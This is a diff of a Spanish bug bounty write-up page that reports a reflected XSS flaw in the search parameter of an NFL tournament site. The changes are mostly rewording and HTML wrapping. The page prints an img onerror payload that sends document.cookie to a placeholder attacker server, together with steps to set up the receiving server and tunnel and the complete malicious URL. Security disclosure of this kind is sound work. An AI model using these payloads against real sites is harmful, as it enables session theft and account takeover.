@@ -1,13 +1,26 @@
 ---
-layout: default
+layout: null
 ---
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFL: XSS Reflejado | ConnorDev</title>
+    <link rel="stylesheet" href="../../../assets/css/styles.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
+</head>
+<body>
+<div class="container submission-body">
+<article class="bounty-report">
+
 # NFL: XSS Reflejado en el Parámetro de Búsqueda URL
 
 [English (EN)](../../../en/bounties/nfl-xss-search-query/)
 
 ## Introducción
 
-Este informe documenta una vulnerabilidad de **Cross-Site Scripting Reflejado (XSS)** descubierta en el dominio público de la NFL `hbcutournament.nfl.com`. La vulnerabilidad reside en el parámetro de la página de resultados de búsqueda, que procesa incorrectamente la entrada suministrada por el usuario sin el saneamiento adecuado, permitiendo la ejecución de código JavaScript arbitrario.
+Este informe documenta una vulnerabilidad de **Cross-Site Scripting Reflejado (XSS)** descubierta en el dominio público de la NFL `hbcutournament.nfl.com`. La vulnerabilidad reside en el parámetro de la página de resultados de búsqueda, que procesa incorrectamente la entrada suministrada por el usuario sin el saneamiento adecuado, lo que permite la ejecución de código JavaScript arbitrario.
 
 ---
 
@@ -20,7 +33,7 @@ https://hbcutournament.nfl.com/resources?q=
 https://hbcutournament.nfl.com/blogs?q=
 ```
 
-Observé que la aplicación no sanea ni codifica correctamente la entrada pasada a través del parámetro `?q=`, lo que permite la inyección en el contexto del navegador.
+Observé que la aplicación no sanea ni codifica adecuadamente la entrada pasada a través del fragmento de URL `?q=`, permitiendo la inyección en el contexto del navegador.
 
 ---
 
@@ -39,9 +52,9 @@ El resultado confirmó que la aplicación estaba renderizando etiquetas HTML cru
 
 ---
 
-## 🚨 Primer Alert (XSS Reflejado)
+## 🚨 Primera Alerta (XSS Reflejado)
 
-Tras confirmar la inyección HTML, pasé a la ejecución de JavaScript. Después de probar varios vectores, descubrí que la etiqueta `<img>` activa eficazmente la ejecución a través del evento `onerror`.
+Tras confirmar la inyección HTML, pasé a la ejecución de JavaScript. Después de probar varios vectores, descubrí que la etiqueta `<img>` activa eficazmente la ejecución mediante el evento `onerror`.
 
 **Payload:**
 ```HTML
@@ -61,7 +74,7 @@ El objetivo final era demostrar un impacto crítico. Diseñé un payload para ex
 
 **Payload:**
 ```html
-<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>
+<img/src/onerror=fetch("http://TU-SERVIDOR-WEB/"+encodeURIComponent(document.cookie))>
 ```
 
 Al engañar a un usuario autenticado para que haga clic en este enlace, un atacante podría robar sus cookies de sesión y lograr el acceso a su cuenta.
@@ -81,14 +94,14 @@ Las cookies exfiltradas se recibieron con éxito en el servidor del atacante:
    python3 -m http.server 8000
    ```
 
-2. **Exponer el Servidor (ej. vía Serveo)**:
+2. **Exponer el Servidor (ej. mediante Serveo)**:
    ```bash
    ssh -R 80:localhost:8000 serveo.net
    ```
 
 3. **Construir la URL Maliciosa**:
-   Reemplaza `YOUR-WEB-SERVER` por la URL pública generada en el payload:
-   `https://hbcutournament.nfl.com/resources?q=<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>`
+   Sustituye `TU-SERVIDOR-WEB` por la URL pública generada en el payload:
+   `https://hbcutournament.nfl.com/resources?q=<img/src/onerror=fetch("http://TU-SERVIDOR-WEB/"+encodeURIComponent(document.cookie))>`
 
 4. **Interacción de la Víctima**:
    Cuando un usuario autenticado visita la URL, sus cookies se envían al servidor del atacante.
@@ -106,3 +119,7 @@ Esta investigación fue realizada en una **colaboración al 50%** entre **{{ sit
 **{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
 **{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
 
+</article>
+</div>
+</body>
+</html>
